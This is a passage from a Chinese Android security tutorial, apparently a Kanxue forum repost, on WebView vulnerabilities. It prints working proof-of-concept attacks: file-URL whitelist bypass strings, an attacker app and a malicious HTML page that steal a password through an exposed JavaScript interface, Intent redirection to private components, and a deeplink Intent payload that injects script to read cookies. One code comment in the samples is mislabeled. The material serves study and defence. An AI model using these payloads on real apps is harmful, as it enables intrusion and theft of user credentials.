此时可以在shouldOverrideUrlLoading函数中拦截跳转，并对跳转的Url进行检查。  
```
public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
    if(chechDomain(request.getUrl().toString())){
        return false; //通过检查，允许跳转
    }
    return true; //未通过检查，允许跳转
}
```  
  
  
  
而很多使用shouldOverrideUrlLoading,也是不安全的使用状态，这样还是会存在一些攻击，具体参考：Android：访问受应用程序保护的组件（  
https://blog.oversecured.com/Android-Access-to-app-protected-components/#access-to-arbitrary-components-via-webview）  
####   
#### （5）file协议绕过  
  
APP经常会使用file://协议加载本地文件，通常会限制在一些特定路径中，参考文章：Android WebView URL检查绕过（  
https://mabin004.github.io/2019/04/23/Android-WebView%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/）  
```
(1)不要用url.startWith(”file://”)来判断是否为file协议，因为“FILE://”(大小)、“File://”(大小写)、“ file://”(前边加空格)、“file:”等方式都可以绕过检测。url.contains(“file://”)更不靠谱，推荐使用getScheme()来判断协议；
(2)file:///android_asset和file:///android_res 也可以../穿越
(3)白名单判断了“../，但通过“..\”也是可以穿越的，例如file:///sdcard/..\../sdcard/1.html
(4)getHost有漏洞（file://a:a@www.qq.com:b@www.baidu.com使用getHost获取到的是qq.com,但实际访问的是baidu.com)
(5)file://baidu.com/data/data/tmp 前边的baidu.com是可以不被解析的
(6)协议头不包括///，还是仍然能够正常loadUrl，如file:mnt/sdcard/filedomain.html
(7)白名单判断了“../”，但通过url编码绕过，例如file:///data/data/com.app/%2e%2e/%2e%2e/%2e%2e/sdcard/xxx
(8)replace(“../“,””)可以使用”….//“绕过
```  
  
  
### 4.Intent+WebView漏洞  
  
****#### （1）Intent访问导出组件加载恶意界面和窃取信息  
  
  
漏洞原理：  
主要通过 WebView 对外暴露的接口和Intent访问导出组件可以导致的攻击手段  
  
   
  
漏洞复现：  
我们编写一个样例代码  
```
public class JsIntentActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_js_intent);
        WebView webView = findViewById(R.id.Wind_webviewIntent);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.addJavascriptInterface(new AndroidtoJs(), "test");
        webView.loadData("", "text/html", null);
        Uri getUri = getIntent().getData();
        webView.loadUrl(String.valueOf(getUri));

    }

    /**
     * 提供接口在Webview中供JS调用
     */
    public class AndroidtoJs {
        // 定义JS需要调用的方法，被JS调用的方法必须加入@JavascriptInterface注解
        @JavascriptInterface
        public String getPassword() {
            return "WindXaa12345678";
        }
    }

}
```  
  
  
  
这里我们可以看出我们获取了密码WindXaa12345678，一般应用程序会对这里进行加密或者混淆，我们这里简单演示就不进行加密了。  
  
   
  
我们将该组件设置为导出组件。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiakDw5dUEE4jBgxUMhQwv5hibjEnjsXGmpa4UiaXibaMYh0vATP0wicG9I2HA/640?wx_fmt=png "")  
  
我们对实例样本分析，这里就可以利用接口导出的漏洞进行攻击。  
  
   
  
漏洞复现：  
我们再编写攻击样本  
```
public class MainActivity extends AppCompatActivity {

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        Button button = findViewById(R.id.button);
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                Intent attackIntent = new Intent();
                attackIntent.setClassName("com.iwindxaa.webview","com.iwindxaa.webview.JsIntentActivity");
                attackIntent.setData(Uri.parse("http://ip地址端口号/attack.html"));
                startActivity(attackIntent);
            }
        });

    }
}
```  
  
  
  
然后我们在本地编写恶意的html，利用前面讲述的远程加载。  
```
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>WebView Atack</title>
    <script>
         function callAndroid(){
            //由于对象映射，所以调用test对象等于调用Android映射的对象
            var password = test.getPassword();
            document.getElementById("getdata").innerHTML= password;
         }
</script>
</head>
<body>
   <p id="getdata">攻击获得的数据将显示在此……</p>
   <!--点击按钮则调用callAndroid函数-->
   <button type="button" id="button1" onclick="callAndroid()">CIntent Attack!</button>
</body>
</html>
```  
  
  
  
然后启动http_server：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiakJp4y6NnGa73d2nuYic471HfVepAJRGsk1ckKF8ovk7lZxiaH53KLWASQ/640?wx_fmt=png "")  
  
此时我们启动攻击样本，并点击按钮：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiakicJKqaF3CDVxxricQZ072sQAaPlV7E8us1YrAoJSpLSqobjUXCw6DDeg/640?wx_fmt=png "")  
  
   
  
这里我们可以成功的加载我们的页面说明恶意html注入成功：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiakRCUKO0DJIPzCIwGkq2vDib4JgQUnWxuGvIUBLWTQ5nSyVvUsC57IFHw/640?wx_fmt=png "")  
  
   
  
然后我们再次点击js中的按钮，就可以获取敏感数据。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiak9dia3HeVVnAz3QlwJiclgniagAZUniaTC8m9DrhfW2RpwxWgNFSiaL7v8Jw/640?wx_fmt=png "")  
  
这里就获取的敏感的数据。  
####   
#### （2）Intent重定向导致launchAnyWhere漏洞  
  
  
漏洞原理：  
我们都知道Android中的组件需要导出才能够访问，而导出的组件往往存在一定的安全问题。  
  
   
  
导出的组件一般有以下三种形式：  
```
1.在AndroidManifest.xml中的组件如果显式设置了组件属性android:exported值为true;
2.如果组件没有显式设置android:exported为false，但是其intent-filter以及action存在，则也为导出组件
3.API Level在17以下的所有App的provider组件的android:exported属性默认值为true，17及以上默认值为false。
```  
  
  
  
未导出的组件：  
```
组件显式设置android:exported="false"
组件没有intent-filter, 且没有显式设置android:exported的属性值，默认为非导出的;
组件虽然配置了intent-filter,，但是显式设置android:exported="false"
```  
  
  
而通过一定的方法可以访问未导出的组件，我们将这种漏洞成为launchAnyWhere漏洞。  
  
   
  
Intent可以通过重定向的原理，通过携带数据信息，访问一个可导出的组件，然后再进行数据传递去触发不可导出的组件，最后实现访问私有组件的目的，引起launchAnyWhere漏洞。  
  
   
  
漏洞复现：  
我们查看一个样本案例。  
  
   
  
首先是不可导出组件PrivateActivity  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiakf8T7Hsg68dkqeq9ibGAzgAkUm6cMsFTqveVFJHnkiccRuDspVWveia2ng/640?wx_fmt=png "")  
  
然后可导出的组件：WebView2Activity  
  
   
  
代码层的校验代码：  
  
WebView2Activity  
  
 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiakYCx9KIIw8lbujSib4HSX0vgHMcn9jyY6LZxMp11VvPHSzticbNPicLBLA/640?wx_fmt=png "")  
  
  
   
  
PrivateActivity  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiakKUCibxRW65WXaHM4sREiaxhKmd5fGKOvRZTLjZChtiaFHHJ1Qw3wWf3dg/640?wx_fmt=png "")  
  
然后我们编写攻击代码：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiakiaS9rgsgIPUkBIRM3alUAex73ibDgicD1xN0saHGz7rg1PISSfbumyyTg/640?wx_fmt=png "")  
  
   
  
效果如下：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiakdo6M0B6U4Vp8cia0j6Nn5g0aGOHdw1x7IlH637EeYOecW3GP8vW8enw/640?wx_fmt=png "")  
  
   
  
可以看出我们通过WebView+Intent重定向就可以访问私有组件，从而实现launchAnyWhere漏洞。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiakV42wnrWNBh3rwZe2hMYpa63S6JOxmEMo2ibNcwsqMBUPZicFRPtwRSLA/640?wx_fmt=png "")  
###   
### 5.Deeplink+WebView漏洞  
  
****  
deeplink 是一种在网页中启动App的超链接。当用户点击deeplink链接时，Android系统会启动注册该deeplink的应用，打开在Manifest文件中注册该deeplink的activity。  
  
   
  
deeplink在APP中会导致多类漏洞：通过deeplink操纵WebView造成的远程代码执行、敏感信息泄露、应用克隆、launchAnyWhere等漏洞。  
####   
#### （1）任意代码执行漏洞  
  
  
漏洞原理：  
样本代码层通过反射调用去安装的列表中搜索安装的应用，然后去调用其方法进行实现，我们可以构造相同的包名，然后将攻击样本去安装到手机上，是的应用触发任意代码执行漏洞  
  
   
  
漏洞复现：  
样本代码段  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiakxb0a6o1DeGicticbbWcQMXRdvH3NmNxw9enYO1CX2nbtggqic2ACLavaQ/640?wx_fmt=png "")  
  
   
  
我们构造Poc：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiakGwo1dSBXb7Uo28iaAgxEdFolueOuacg4GcHPYGJR4mzxw6AFZWs67ibA/640?wx_fmt=png "")  
  
注意这里我们要保证构造的攻击应用的包名和代码中校验的一致才能触发，然后我们启动，可以发现成功的触发了。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiakg4AkTiawAy4BIUu404SkQDU5EbX4Rsv1j7zCzqwwLaOoHqWBvCDyAvw/640?wx_fmt=png "")  
  
   
  
漏洞防护：  
需要对具体的包名进行校验，并对DeepLink进行过滤  
（2）XSS注入漏洞  
  
  
漏洞原理：  
这也是我们结合Deeplink+WebView导致的一个漏洞问题，我们可以通过构造含深度调用链的JS，然后通过加载去实现XSS注入  
  
   
  
漏洞复现：  
首先我们查看样本的DeepLinks：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiakLlW5jf1PnbEgZgDqALS4m6ycZklewOgKwialibiccsIBd4H9YOFzEraFw/640?wx_fmt=png "")  
  
   
  
然后我们可以发现样本的代码：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiakaDxbkN84eExruY9xQwiaXZ2UItfPLr5NM0v5J2td3pf3icg42Via1vCSg/640?wx_fmt=png "")  
  
   
  
我们构造攻击脚本：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiakcpt2tF53xqw8FDicbUD09QsUYp1feZe0tfqlzg8fJByKwcyf7NyaGbw/640?wx_fmt=png "")  
  
   
  
然后我们通过去访问该html：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiakNITZOuc6eaEYJlf1FiaQ3rNXacJsG36qictVgcY2HN1Sow6hgmRBA3RQ/640?wx_fmt=png "")  
  
   
  
接着我们使用目标样本打开：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiakRQwDmZBrLQkz2Ss2W4BkKqynJFq41oicMPbECjmx7ZeeaJ13juhxeZQ/640?wx_fmt=png "")  
  
   
  
即可以成功的进行XSS注入：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiakDhRDkCaiaibicMmqSr3XWD60XxFsemsOpTMtvn4PKcfzaZnmKb8jJabsw/640?wx_fmt=png "")  
####   
#### （3）DeepLinks在WebView上的组合漏洞  
  
我们前面分析了很多DeepLinks在WebView上的漏洞，我们还可以将这些漏洞组合使用，我在测试一款银行的样本中发现组合漏洞：  
  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiakcewwJH3J1mpxicc1cNk2JPAzwfuUtBoFpfQL5v1HyfGIrTNxrT8ZAPg/640?wx_fmt=png "")  
  
   
  
这个结合了前面我们讲的网络漏洞、路径穿越、XSS、WebView漏洞，具体的大家可以去听我在平安SRC&&看雪的沙龙会议中的演讲。  
  
   
  
以及我在网上收集的一个大佬的文章，描述的漏洞利用流程，大家可以参考：  
  
   
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FlmaXSHgoC0UknOib3jVUiak7icGZsBVib84MJtPibrDrG9xuYxb77W5QdWCpVB7siahpPU3DPPabf07Sw/640?wx_fmt=png "")  
  
   
  
参考文章：APP漏洞利用组合拳——应用克隆案例分析（  
http://blog.nsfocus.net/app-vulnerability-exploitation-combination-boxing/）  
####   
#### （4）loadDataWithBaseURL漏洞  
  
当loadDataWithBaseURL的域名和内容同时可控是，可以构造任意域下的XSS  
```
void loadDataWithBaseURL
(String baseUrl,
String data,
String mimeType,
String encoding,
String historyUrl)
```  
  
  
  
除了明显的情况外，攻击者控制调用中的baseUri和参数data  
```
webView.loadDataWithBaseURL("https://google.com/",
           "<script>document.write(document.domain)</script>",
           null, null, null);
```  
  
  
  
漏洞原理：  
deeplink加载任意fragment，转化为WebView loadDataWithBaseURL漏洞。  
  
   
  
漏洞复现  
  
  
实现步骤：  
```
(1)victim-app://c/contact/2?fragmen_class=<fragment>可启动任意fragment，并可 通过Intent Extra传参
(2)寻找到⼀个带WebView的Fragment：GoogleMapWebViewFragment
(3)可污染loadDataWithBaseURL的前两个参数，构造victim.com域下的XSS
webview.loadDataWithBaseURL("victim.com","google-map.html",    "text/html",    ...);
```  
  
  
  
攻击代码  
```
Intent payload = new Intent(Intent.ACTION_VIEW);
payload.setData(Uri.parse("victim-app://c/contact/2?fragmen_class=com.victim.app.GoogleWebViewMapFragment"));
Bundle extra = new Bundle();
extra.putString("map_url", "\"></script><script>alert(document.cookie);</script><script>");
extra.putString("map_file_name", "google_map.html");
extra.putString("map_domain", "https://www.victim-app.com");
payload.putExtra("bundle", extra);
startActivity(payload);
```  
  
  
可以通过这个deeplink打开任意fragment的漏洞，实现可控任意域执行任意JS，实现盗取登陆态的用户cookie！  
  
   
  
具体参考：[Android中的特殊攻击面（二）——危险的deeplink](https://mp.weixin.qq.com/s?__biz=MzUyNzc4Mzk3MQ==&mid=2247485506&idx=1&sn=bfed52addd1b6e48907dfe7b74c67d72&scene=21#wechat_redirect)  
  
（  
https://mp.weixin.qq.com/s/81Lq-JwASnkSS2wg62HSvA?）  
##   
  
```
```  
  
  
本文我编写了很久，主要是一些案例和网上的漏洞复现需要大量的时间去做，很多案例和攻击poc，我都进行了手动编写，一些网上已有的大佬的文章样例，我也进行了一一的复现，将一些不能复现的全部剔除，WebView漏洞是Android APP上当前十分重要的漏洞，漏洞的种类十分多。  
  
  
本文归纳了20多种类别的漏洞并进行了一一的复现，具体漏洞扩展，大家可以参考后面的文献，而实验的poc和攻击样本我也会上传知识星球和github。  
  
   
  
github网址：WindXaa（https://github.com/WindXaa）  
##   
##   
##   
```
```  
  
  
会议：2020 看雪SDC  Android WebView安全攻防指南2020  
  
  
**WebView的原理**  
  
https://ljd1996.github.io/2020/12/01/Android-WebView%E7%AC%94%E8%AE%B0/  
  
https://blog.csdn.net/carson_ho/article/details/64904691  
  
https://juejin.cn/post/6844903564737789965#heading-9  
  
https://www.cnblogs.com/linhaostudy/p/14617314.html  
  
https://mabin004.github.io/2018/06/11/Android-JsBridge/  
  
  
**远程代码执行漏洞**  
  
https://cloud.tencent.com/developer/article/1394368  
  
https://blog.csdn.net/weixin_39190897/article/details/125107626  
  
****  
**WebView跨域漏洞**  
  
https://blogs.360.cn/post/webview%E8%B7%A8%E6%BA%90%E6%94%BB%E5%87%BB%E5%88%86%E6%9E%90.html  
  
https://blog.csdn.net/qq_35993502/article/details/121371049  
  
https://bbs.pediy.com/thread-269849.htm  
  
https://forum.butian.net/share/1562  
  
****  
**URL配置漏洞**  
  
https://www.freebuf.com/articles/terminal/201407.html  
  
https://mabin004.github.io/2019/04/23/Android-WebView%E7%99%BD%E5%90%8D%E5%8D%95%E7%BB%95%E8%BF%87/  
  
https://www.freebuf.com/articles/web/208868.html  
  
****  
**Intent Scheme绕过**  
  
http://drops.xmd5.com/static/drops/papers-2893.html  
  
https://blog.csdn.net/l173864930/article/details/36951805  
  
****  
**Intent**  
  
https://blogs.360.cn/post/launchanywhere-google-bug-7699048.html  
  
http://drops.xmd5.com/static/drops/papers-2893.html  
  
****  
**deeplink**  
  
https://mp.weixin.qq.com/s/81Lq-JwASnkSS2wg62HSvA?  
  
http://blog.nsfocus.net/app-vulnerability-exploitation-combination-boxing/  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EEad1icibP0gvPohYqbsUl0q3Jmfibia43qncfHxmnV2G3h2lFNIyS4vPo8EW9w7sbvXhiaJScrBwiad0Q/640?wx_fmt=png "")  
  
  
**看雪ID：随风而行aa**  
  
https://bbs.pediy.com/user-home-905443.htm  
  
*本文由看雪论坛 随风而行aa 原创，转载请注明来自看雪社区  
  
  
[](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458458969&idx=2&sn=d1669d8eed5c67f4835f944acc6bcd27&chksm=b18e2bd386f9a2c502191f1eefde75f40bef93bef65860ba2043eb4c373f9be2f173f2b79019&scene=21#wechat_redirect)  
  
  
  
**#****往期推荐**  
  
1.[uds诊断协议-逆向题 WP](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458463454&idx=1&sn=6832f219233dc5e0cf8b010b6e7779fe&chksm=b18e1c5486f9954229d3277c2300f6c225dd3d090ff3d8f3b86a3b27f5de2251bffed63c6afb&scene=21#wechat_redirect)  
  
  
2.[CVE-2018-18708 TENDA缓冲区溢出漏洞](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458463453&idx=2&sn=aafc9c9a5d35924c81bedf54574f7f40&chksm=b18e1c5786f9954158614d47027a32601e9f0b8bdea361f4aaa4acd4c8646a97a1c24ff0bbdc&scene=21#wechat_redirect)  
  
  
3.[使用AFL++复现历史CVE](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458463012&idx=1&sn=168bcf8ed4e910a3ea4cfdea4541cc63&chksm=b18e1bae86f992b85098a855dbb9a8e410ee97441d13ad958d3d0840f94379f170e98a5f2fb6&scene=21#wechat_redirect)  
  
  
4.[CVE-2018-8453提权漏洞学习笔记](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458461724&idx=1&sn=7d6ba28997f645f74b3c8d692fb7dd9f&chksm=b18e169686f99f80223eeb9691f49b066081214ac3fbc568ffdd0274b7330902071b9d2f5ae0&scene=21#wechat_redirect)  
  
  
5.[巧解一道CTF Android题](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458461590&idx=1&sn=719ca0cd4fa9dfbd674fbd9a0aa7e010&chksm=b18e151c86f99c0a7ee78ce75e18069d0e9a9d175a5ab181b27622a3a3a39f923bcf0af9405c&scene=21#wechat_redirect)  
  
  
6.[C++异常处理控制流下的OLLVM混淆](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458461242&idx=1&sn=a4bb445d012983034029dcb1938d4061&chksm=b18e14b086f99da63a540f9e1f2df428e5a4fbd7bdf2c846c3516ea5d8b97e8ba519402a6e7b&scene=21#wechat_redirect)  
****  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Uia4617poZXP96fGaMPXib13V1bJ52yHq9ycD9Zv3WhiaRb2rKV6wghrNa4VyFR2wibBVNfZt3M5IuUiauQGHvxhQrA/640?wx_fmt=jpeg "")  
  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicdP7bNEwt8Ew5l2fRJxWETW07MNo7TW5xnw60R9WSwicicxtkCEFicpAlQg/640?wx_fmt=gif "")  
  
**球分享**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicdP7bNEwt8Ew5l2fRJxWETW07MNo7TW5xnw60R9WSwicicxtkCEFicpAlQg/640?wx_fmt=gif "")  
  
**球点赞**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicdP7bNEwt8Ew5l2fRJxWETW07MNo7TW5xnw60R9WSwicicxtkCEFicpAlQg/640?wx_fmt=gif "")  
  
**球在看**  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8EbEJaHl4j4oA4ejnuzPAicd7icG69uHMQX9DaOnSPpTgamYf9cLw1XbJLEGr5Eic62BdV6TRKCjWVSQ/640?wx_fmt=gif "")  
  
点击“阅读原文”，了解更多！  
